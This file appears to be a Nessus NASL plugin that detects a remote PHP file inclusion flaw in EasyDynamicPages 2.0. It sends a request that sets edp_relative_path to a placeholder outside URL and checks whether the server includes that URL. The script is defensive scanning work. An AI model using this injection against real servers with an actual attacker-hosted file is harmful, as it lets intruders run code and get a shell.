#
# (C) Tenable Network Security
#
# Ref:
#  To: BugTraq
#  Subject: include() vuln in EasyDynamicPages v.2.0
#  Date: Jan 2 2004 3:18PM
#  Author: Vietnamese Security Group <security security com vn>
#  Message-ID: <20040102151821.9686.qmail@sf-www3-symnsj.securityfocus.com>

if(description)
{
 script_id(11976);
 script_version ("$Revision: 1.5 $");

 name["english"] = "EasyDynamicPages code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running EasyDynamicPages, a set of PHP scripts 
designed to help web publication.

It is possible this suite to make the remote host include php files hosted
on a third party server.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade to the latest version of EasyDynamicPages
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of EasyDynamicPages";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);





foreach dir (cgi_dirs())
 {
 req = http_get(item:string(dir, "/dynamicpages/fast/config_page.php?do=add_page&du=site&edp_relative_path=http://xxxxxxxxxx/"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if("http://xxxxxxxxxx/admin/site_settings.php" >< r)
  {
 	security_hole(port);
	exit(0);
  }
}
